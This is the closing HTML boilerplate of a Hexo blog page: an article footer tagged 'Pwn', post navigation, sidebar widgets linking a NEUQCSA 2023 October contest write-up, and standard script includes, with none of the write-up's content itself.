      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2023/11/04/NEUQCSA-10%E6%9C%88%E6%9C%88%E8%B5%9B%E9%A2%98%E8%A7%A3/" data-id="clojpbdic0000z0aied7jc2c5" data-title="NEUQCSA-2023-10月赛题解" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Pwn/" rel="tag">Pwn</a></li></ul>

    </footer>
  </div>
  
    
<nav id="article-nav">
  
  
    <a href="/2023/11/04/hello-world/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title">Hello World</div>
    </a>
  
</nav>

  
</article>


</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Categories</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/NEUQCSA/">NEUQCSA</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Pwn/" rel="tag">Pwn</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/Pwn/" style="font-size: 10px;">Pwn</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/11/">November 2023</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2023/11/04/NEUQCSA-10%E6%9C%88%E6%9C%88%E8%B5%9B%E9%A2%98%E8%A7%A3/">NEUQCSA-2023-10月赛题解</a>
          </li>
        
          <li>
            <a href="/2023/11/04/hello-world/">Hello World</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2023 John Doe<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.6.4.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>